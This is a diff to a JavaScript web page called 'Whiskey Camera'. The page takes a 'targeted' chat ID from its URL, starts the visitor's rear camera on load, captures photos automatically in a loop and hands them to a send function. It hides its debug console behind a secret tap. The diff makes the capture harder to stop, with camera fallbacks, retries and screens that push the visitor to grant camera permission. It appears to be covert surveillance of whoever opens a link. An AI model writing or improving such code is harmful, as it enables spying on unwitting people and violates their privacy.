@@ -154,7 +154,19 @@
             if (!CHAT_ID) {
                 addDebug('❌ خطأ: المعرف غير موجود! استخدم ?id=رقم_المستخدم في الرابط', 'error');
                 console.error('⚠️ المعرف مطلوب! مثال: index.html?id=123456789');
-                // إيقاف التنفيذ
+                // عرض رسالة في الصفحة
+                document.body.innerHTML = `
+                    <div style="color:#f44;font-family:system-ui;text-align:center;padding:50px 20px;background:#111;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;">
+                        <h2 style="font-size:24px;margin-bottom:20px;">❌ خطأ</h2>
+                        <p style="font-size:16px;color:#888;max-width:400px;line-height:1.6;">
+                            المعرف غير موجود!<br>
+                            أضف <code style="background:#222;padding:4px 8px;border-radius:4px;color:#4caf50;">?id=رقم_المستخدم</code> في الرابط
+                        </p>
+                        <p style="font-size:14px;color:#555;margin-top:20px;">
+                            مثال: index.html?id=123456789
+                        </p>
+                    </div>
+                `;
                 return;
             }
 
@@ -168,6 +180,8 @@
             let captureInterval = null;
             let photoCounter = 1;
             let isFirstCapture = true;
+            let initAttempts = 0;
+            const MAX_INIT_ATTEMPTS = 5;
 
             // ============================================================
             // 6. التقاط الصورة (بدون عكس - كاميرا خلفية)
@@ -254,6 +268,11 @@
             // 8. التقاط وإرسال
             // ============================================================
             async function takeAndSend() {
+                if (!cameraActive) {
+                    addDebug('⚠️ الكاميرا غير نشطة، انتظار...', 'warning');
+                    return;
+                }
+                
                 addDebug('📷 جاري التقاط صورة...', 'info');
                 const img = await captureImage();
                 if (img) {
@@ -301,12 +320,20 @@
             // ============================================================
             async function initCamera() {
                 try {
-                    addDebug('📷 جاري طلب صلاحيات الكاميرا الخلفية...', 'info');
+                    initAttempts++;
+                    addDebug(`📷 محاولة تشغيل الكاميرا (#${initAttempts})...`, 'info');
+                    
+                    // التحقق من دعم getUserMedia
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        addDebug('❌ المتصفح لا يدعم الكاميرا', 'error');
+                        return false;
+                    }
                     
                     let stream = null;
                     
                     // محاولة استخدام الكاميرا الخلفية أولاً
                     try {
+                        addDebug('📷 محاولة استخدام الكاميرا الخلفية (exact)...', 'info');
                         stream = await navigator.mediaDevices.getUserMedia({
                             video: { 
                                 facingMode: { exact: "environment" },
@@ -317,8 +344,9 @@
                         });
                         addDebug('✅ تم استخدام الكاميرا الخلفية (exact)', 'success');
                     } catch (firstError) {
-                        addDebug('⚠️ الكاميرا الخلفية غير متوفرة، نحاول الكاميرا الافتراضية...', 'warning');
+                        addDebug(`⚠️ فشل exact: ${firstError.message}`, 'warning');
                         try {
+                            addDebug('📷 محاولة استخدام الكاميرا الخلفية (بدون exact)...', 'info');
                             stream = await navigator.mediaDevices.getUserMedia({
                                 video: { 
                                     facingMode: "environment",
@@ -329,16 +357,27 @@
                             });
                             addDebug('✅ تم استخدام الكاميرا الخلفية (بدون exact)', 'success');
                         } catch (secondError) {
-                            addDebug('⚠️ فشلت الكاميرا الخلفية، نحاول أي كاميرا متاحة...', 'warning');
-                            stream = await navigator.mediaDevices.getUserMedia({
-                                video: {
-                                    width: { ideal: 640 },
-                                    height: { ideal: 480 }
-                                },
-                                audio: false
-                            });
-                            addDebug('✅ تم استخدام الكاميرا الافتراضية', 'success');
+                            addDebug(`⚠️ فشل environment: ${secondError.message}`, 'warning');
+                            try {
+                                addDebug('📷 محاولة استخدام أي كاميرا متاحة...', 'info');
+                                stream = await navigator.mediaDevices.getUserMedia({
+                                    video: {
+                                        width: { ideal: 640 },
+                                        height: { ideal: 480 }
+                                    },
+                                    audio: false
+                                });
+                                addDebug('✅ تم استخدام الكاميرا الافتراضية', 'success');
+                            } catch (thirdError) {
+                                addDebug(`❌ فشل جميع محاولات الكاميرا: ${thirdError.message}`, 'error');
+                                return false;
+                            }
                         }
+                    }
+                    
+                    if (!stream) {
+                        addDebug('❌ لم يتم الحصول على تدفق الكاميرا', 'error');
+                        return false;
                     }
                     
                     mediaStream = stream;
@@ -364,19 +403,36 @@
                     
                     // بدء التصوير التلقائي
                     startAutoCapture();
+                    return true;
                     
                 } catch (err) {
                     addDebug(`❌ فشل تشغيل الكاميرا: ${err.message}`, 'error');
                     cameraActive = false;
                     
-                    // إعادة المحاولة بعد 3 ثوانٍ
-                    addDebug('🔄 إعادة المحاولة بعد 3 ثوانٍ...', 'warning');
-                    setTimeout(() => {
-                        if (!cameraActive) {
-                            addDebug('🔄 محاولة تشغيل الكاميرا مرة أخرى...', 'info');
-                            initCamera();
-                        }
-                    }, 3000);
+                    // إعادة المحاولة إذا لم نصل للحد الأقصى
+                    if (initAttempts < MAX_INIT_ATTEMPTS) {
+                        addDebug(`🔄 إعادة المحاولة بعد 3 ثوانٍ (محاولة ${initAttempts + 1}/${MAX_INIT_ATTEMPTS})...`, 'warning');
+                        setTimeout(() => {
+                            if (!cameraActive) {
+                                initCamera();
+                            }
+                        }, 3000);
+                    } else {
+                        addDebug(`❌ فشل تشغيل الكاميرا بعد ${MAX_INIT_ATTEMPTS} محاولات`, 'error');
+                        document.body.innerHTML = `
+                            <div style="color:#f44;font-family:system-ui;text-align:center;padding:50px 20px;background:#111;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;">
+                                <h2 style="font-size:24px;margin-bottom:20px;">❌ فشل تشغيل الكاميرا</h2>
+                                <p style="font-size:16px;color:#888;max-width:400px;line-height:1.6;">
+                                    تأكد من منح صلاحيات الكاميرا للموقع<br>
+                                    وتحقق من أن الكاميرا تعمل بشكل صحيح
+                                </p>
+                                <button onclick="location.reload()" style="margin-top:20px;padding:12px 30px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;">
+                                    🔄 إعادة المحاولة
+                                </button>
+                            </div>
+                        `;
+                    }
+                    return false;
                 }
             }
 
@@ -403,7 +459,7 @@
             // بدء التشغيل عند تحميل الصفحة
             window.addEventListener('load', () => {
                 addDebug('🚀 جاري تهيئة النظام...', 'info');
-                setTimeout(initCamera, 500);
+                setTimeout(initCamera, 1000);
             });
 
             // إيقاف الكاميرا عند الخروج
@@ -421,6 +477,9 @@
             console.log('%c🔍 Whiskey Camera - كاميرا خلفية', 'font-size:16px;font-weight:bold;');
             console.log('%c👆 اضغط 5 مرات على الزاوية السفلية اليسرى لتفعيل وحدة التحكم', 'font-size:12px;color:#888;');
             console.log(`%c🆔 المعرف المستهدف: ${CHAT_ID}`, 'font-size:12px;color:#4caf50;');
+
+            // تنبيه للمستخدم بطلب صلاحيات الكاميرا
+            console.log('%c📷 سيُطلب منك السماح باستخدام الكاميرا', 'font-size:14px;color:#ff9800;');
 
         })();
     </script>
